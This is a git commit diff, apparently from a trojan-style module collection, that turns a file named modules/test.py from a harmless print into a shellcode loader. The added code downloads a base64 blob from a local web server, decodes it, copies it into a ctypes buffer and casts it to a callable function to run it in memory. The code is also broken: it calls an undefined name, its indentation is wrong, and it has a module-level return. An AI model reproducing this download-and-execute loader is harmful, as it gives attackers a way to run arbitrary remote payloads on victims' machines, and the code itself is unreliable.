0a270d98267d27cce9f7da77b7910ab06a4f275d
experiment2016 <sarpiericam@libero.it>
2016-05-30 10:54:01 +0200

    Update test.py

--- modules/test.py
+++ modules/test.py
@@ -1,8 +1,20 @@
+try:
+  import urllib2
+  import ctypes
+  import base64
+except Exception, e:
+  return str(e)
 
 def run(**args):
   try:
-      print("[*} testing")
-  except Exception, e:
-    return str(e)
+      url = "http://localhost:8000/sfile.bin"
+      response = urllib2.urlopen(url)
+      launch = base64.b64decode(response.read())
+      launch_buffer = ctypes.create_string_buffer(launch, len(launch))
+      launch_func   = ctypes.cast(launch_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
+
+      shellcode_func()
+        except Exception, e:
+          return str(e)
   
   
